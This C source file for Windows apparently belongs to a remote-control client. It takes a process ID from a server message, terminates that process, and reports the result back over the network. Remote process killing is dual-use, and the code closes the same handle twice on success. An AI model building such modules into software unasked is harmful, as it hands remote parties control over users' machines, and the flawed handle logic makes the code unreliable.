#include <windows.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"

#define SERV_TASKKILL_FAILED 0xF

int cmds_TASKKILL(uint8* msg)
{
	uint32 pid = ((msg[0] & 0xFF) << 24) | ((msg[1] & 0xFF) << 16) | ((msg[2] & 0xFF) << 8) | (msg[3] & 0xFF);

	HANDLE hand = OpenProcess(PROCESS_TERMINATE, 0, pid);

	if(!hand)
	{
		if(net_SendEmptyCmd(SERV_TASKKILL_FAILED) < 1)
		{
			return 0;
		}

		return 1;
	}

	if(TerminateProcess(hand, 0))
	{
		CloseHandle(hand);

		if(net_SendEmptyCmd(CMDS_TASK_KILL) < 1)
		{
			return 0;
		}
	}else{
		if(net_SendEmptyCmd(SERV_TASKKILL_FAILED) < 1)
		{
			return 0;
		}
	}

	CloseHandle(hand);

	return 1;
}